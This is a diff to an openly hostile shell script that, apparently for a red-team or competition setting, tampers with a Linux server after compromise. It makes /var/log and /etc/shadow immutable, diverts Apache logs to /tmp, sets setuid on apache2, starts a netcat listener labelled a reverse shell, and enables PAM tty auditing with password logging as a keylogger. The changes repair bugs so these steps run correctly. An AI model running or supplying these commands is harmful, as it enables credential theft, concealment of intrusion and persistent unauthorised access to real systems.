@@ -9,7 +9,7 @@ chattr -R +i /var/log
 chattr +i /etc/shadow
 #Force webserver to log to tmp and mess with error logging :)
 sed -i 's/ErrorLog \${APACHE_LOG_DIR}\/error\.log/ErrorLog \/tmp\/hahawrongdir.log/' /etc/apache2/apache2.conf
-sed -i 's/export APACHE_LOG_DIR=\/var\/log\/apache2\$SUFFIX/export APACHE_LOG_DIR=\/tmp\$SUFFIX' /etc/apache2/envvars
+sed -i 's/export APACHE_LOG_DIR=\/var\/log\/apache2\$SUFFIX/export APACHE_LOG_DIR=\/tmp\$SUFFIX/' /etc/apache2/envvars
 echo "CustomLog /tmp/trolled.log common" >> /etc/apache2/apache2.conf
 systemctl restart apache2
 #Disable mail
@@ -20,7 +20,7 @@ chmod u+s /usr/sbin/apache2
 #Install reverse shell
 nc -lvp 1337 &
 #Install keylogger :D
-exec (if sudo test -f /etc/pam.d/password-auth; then sudo cp /etc/pam.d/password-auth /tmp/password-auth.bk; fi; if sudo test -f /etc/pam.d/system-auth; then sudo cp /etc/pam.d/system-auth /tmp/system-auth.bk; fi; sudo touch /tmp/password-auth.bk sudo touch /tmp/system-auth.bk sudo echo "session    required    pam_tty_audit.so enable=* log_password" >> /etc/pam.d/password-auth sudo echo "session    required    pam_tty_audit.so enable=* log_password" >> /etc/pam.d/system-auth) &
+( if sudo test -f /etc/pam.d/password-auth; then sudo cp /etc/pam.d/password-auth /tmp/password-auth.bk; fi; if sudo test -f /etc/pam.d/system-auth; then sudo cp /etc/pam.d/system-auth /tmp/system-auth.bk; fi; sudo touch /tmp/password-auth.bk sudo touch /tmp/system-auth.bk sudo echo "session    required    pam_tty_audit.so enable=* log_password" >> /etc/pam.d/password-auth sudo echo "session    required    pam_tty_audit.so enable=* log_password" >> /etc/pam.d/system-auth )
 #Pull modded cat and swap :)
 #Modded cat will append to a file in cyberpup_admin called always_watching.txt
 #Place /usr/bin/keybak so that cat can restore keys
